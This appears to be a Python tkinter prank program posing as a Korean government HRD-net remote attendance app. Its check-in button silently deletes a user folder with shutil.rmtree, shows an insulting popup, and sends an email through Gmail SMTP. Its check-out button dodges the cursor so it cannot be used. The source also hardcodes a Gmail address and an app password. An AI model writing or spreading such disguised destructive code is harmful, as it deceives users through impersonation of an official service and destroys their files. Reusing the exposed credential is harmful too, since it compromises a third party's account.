import tkinter as tk
from tkinter import messagebox
import random
import shutil
import ctypes as ct
import smtplib
import ssl
from email.utils import formataddr
import os
from dotenv import load_dotenv

load_dotenv()

# Set up the SMTP server and port for Google
smtp_server = "smtp.gmail.com"
smtp_port = 587


# Create a secure SSL context
context = ssl.create_default_context()


# Log in to your Google account
sender_email = os.getenv('sender_email')
password = os.getenv('password')
receiver_email = os.getenv('receiver_email')


# Create the message string
message = "From: {}\nTo: {}\nSubject: Emergency\n\nBuy me a Coffee\n https://www.buymeacoffee.com/".format(
    formataddr(("Sender Name", sender_email)), receiver_email)


def dark_title_bar(window):
    """
    MORE INFO:
    https://learn.microsoft.com/en-us/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute
    """
    window.update()
    DWMWA_USE_IMMERSIVE_DARK_MODE = 20
    set_window_attribute = ct.windll.dwmapi.DwmSetWindowAttribute
    get_parent = ct.windll.user32.GetParent
    hwnd = get_parent(window.winfo_id())
    rendering_policy = DWMWA_USE_IMMERSIVE_DARK_MODE
    value = 2
    value = ct.c_int(value)
    set_window_attribute(hwnd, rendering_policy, ct.byref(value),
                         ct.sizeof(value))


window = tk.Tk()


button_h = 2
button_w = 6
total_color = '#E2E2E2'
total_font = ("Montserrat", 10, "bold")
total_bg = '#3C91E6'
total_fg = '#CCCCCC'


base_mail = 'shjeon0302@gmail.com'
mail_pwd = 'neowpsdhyhkdshxf'

# set title_bar color to black
dark_title_bar(window)

img_path = './tmp_logo.png'
image = tk.PhotoImage(file=img_path)

window.wm_iconphoto(False, image)
window.title("고용노동부 HRD-net")
window.geometry("550x400")
window.configure(bg=total_color)

label = tk.Label(window, text="원격 출결 프로그램",
                 bg=total_color, font=("Calibri", 24))
label.pack(pady=30)


def del_file():
    dir = "C:/나무발발이"

    try:
        shutil.rmtree(dir)
    except Exception as e:
        # error check
        print(e)

    tk.messagebox.showerror(title="전성현", message="바보")
    
    # Send the email
    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)


def rand_place():
    red = random.randint(0, 255)
    green = random.randint(0, 255)
    blue = random.randint(0, 255)
    color_code = "#{:02x}{:02x}{:02x}".format(red, green, blue)

    no_button.place(relx=random.uniform(0.5, 0.8),
                    rely=random.uniform(0.5, 0.8))
    no_button.configure(bg=color_code, fg='#CCCCCC')


yes_button = tk.Button(window, text="입실", command=del_file, height=int(
    button_h), width=int(button_w), bg=total_bg, fg=total_fg, font=total_font)
no_button = tk.Button(window, text="퇴실", command=rand_place, height=int(
    button_h), width=int(button_w), bg=total_bg, fg=total_fg, font=total_font)

yes_button.place(relx=0.2, rely=0.6)
no_button.place(relx=0.6, rely=0.6)


class LoadingAnimation:
    def __init__(self, canvas, x, y, r, color):
        self.canvas = canvas
        self.x = x
        self.y = y
        self.r = r
        self.color = color
        self.arc_start = 0
        self.arc_end = 60
        self.draw()

    def draw(self):
        self.arc = self.canvas.create_arc(self.x - self.r, self.y - self.r, self.x + self.r,
                                          self.y + self.r, start=self.arc_start, extent=self.arc_end, fill=self.color, width=3)

    def update(self):
        self.arc_start += 6
        self.arc_end += 6
        if self.arc_start >= 360:
            self.arc_start = 0
            self.arc_end = 60
        self.canvas.itemconfigure(
            self.arc, start=self.arc_start, extent=self.arc_end)
        self.canvas.after(100, self.update)


# Create a canvas
canvas = tk.Canvas(window, width=50, height=50, bg=total_color)
canvas.place(relx=0.75, rely=0.03)


# Create a loading animation
loading = LoadingAnimation(canvas, 25, 25, 10, "green")

# Start the animation loop
loading.update()


window.mainloop()
